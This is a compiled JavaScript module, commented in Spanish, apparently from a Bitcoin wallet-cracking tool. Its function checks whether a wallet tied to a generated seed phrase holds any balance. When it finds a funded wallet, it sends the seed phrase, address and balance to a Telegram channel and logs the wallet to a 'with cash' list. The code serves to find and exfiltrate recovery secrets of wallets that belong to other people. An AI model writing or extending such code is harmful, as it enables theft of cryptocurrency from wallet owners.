"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.ValidarSaldoWallet = void 0;
const escribirWalletConCash_1 = require("../guardar/escribirWalletConCash");
const telegram_1 = require("../telegram/telegram");
const __1 = require("../..");
// Función para validar el saldo
const ValidarSaldoWallet = async (wallet, semillas, walletBTC) => {
    //valido si el saldo actual, recibido o sin confirmar existe.
    if (wallet.confirmed > 0 ||
        wallet.received > 0 ||
        wallet.unconfirmed > 0) {
        //objeto BTC
        const datos_BTC = {
            frase: semillas,
            wallet_de: "BTC",
            direccion: walletBTC.Direccion,
            saldo: `confi: ${wallet.confirmed}, unconf: ${wallet.unconfirmed}`,
            fecha: new Date().toISOString(),
        };
        //encontrar wallet con balance positivo o por confirmar
        if (wallet.confirmed > 0 || wallet.unconfirmed > 0) {
            //enviar por telegram
            await (0, telegram_1.enviarMensajeTelegram)(datos_BTC);
            //sumar en variable console.log
            (0, __1.addToWalletsConCash)(1);
        }
        await (0, escribirWalletConCash_1.agregarWalletConCash)(datos_BTC);
    }
};
exports.ValidarSaldoWallet = ValidarSaldoWallet;
